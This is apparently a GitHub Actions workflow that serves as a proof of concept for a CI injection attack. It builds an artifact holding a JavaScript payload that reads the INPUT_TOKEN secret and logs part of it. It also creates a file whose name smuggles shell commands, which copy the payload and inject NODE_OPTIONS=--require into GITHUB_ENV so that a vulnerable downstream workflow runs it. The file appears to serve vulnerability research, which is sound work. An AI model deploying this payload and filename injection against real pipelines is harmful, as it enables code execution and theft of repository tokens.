name: Test

on:
  pull_request:

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          printf 'hello\n' > content/report.txt
          cat > content/evil.txt <<'EOF'
          const fs=require('fs');
          try{
            const t=process.env.INPUT_TOKEN||'';
            const m='len='+t.length+' prefix='+t.slice(0,4);
            fs.writeFileSync('/tmp/leak.txt',m);
            console.log('::notice::GAB_INPUT_TOKEN '+m);
          }catch(e){console.log('::notice::GAB_EVIL_ERR '+e.message);}
          EOF
          printf 'x\n' > "content/report.txt;cp /tmp/content/content-poc/evil.txt /tmp/evil.js;sed -i 1iNODE_OPTIONS=--require=/tmp/evil.js \$GITHUB_ENV;true;#.txt"
      - uses: actions/upload-artifact@v4
        with:
          name: content-poc
          path: content/
